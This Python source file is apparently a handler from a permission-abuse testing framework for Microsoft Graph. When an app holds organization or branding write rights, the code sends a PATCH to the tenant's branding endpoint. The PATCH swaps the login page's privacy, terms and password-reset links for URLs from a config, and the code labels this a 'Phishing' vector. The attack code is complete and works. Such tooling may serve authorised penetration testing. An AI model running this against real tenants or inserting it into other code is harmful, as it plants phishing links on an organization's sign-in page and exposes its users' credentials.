from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.organization_handler')


class Organization_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if ("Organization.ReadWrite.All" in request.roles) or ("OrganizationalBranding.ReadWrite.All" in request.roles):
            logger.info('tid: %s, appid: %s may be vulnerable to org_branding_meth vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "org_branding_methVectors"
            message = ""
            error = "org_branding_methVectors - failed"
            conf = request.attack_config['organization']
            logger.debug("Organization.RW.All - Allows the app to read and write the organization and related resources, on behalf of the signed-in user.")
            logger.debug("OrganizationalBranding.ReadWrite.All - Read and write organizational branding information.")
            logger.debug("Attack vector - Phishing.")
            try:
                create_message_URL = "https://graph.microsoft.com/v1.0/organization/" + conf["orgID"] + "/branding"
                message_obj = {
                    "customPrivacyAndCookiesUrl": conf["urlPrivacy"],
                    "customTermsOfUseUrl": conf["TermsUrl"],
                    "customAccountResetCredentialsUrl": conf["resetUrl"]
                }

                result = requests.patch(create_message_URL, json=message_obj, headers=request.request_headers)

                if result.status_code == 204:
                    status = True
                    message += "Seems like your data was added to the login page.\n"            
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in organization_handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
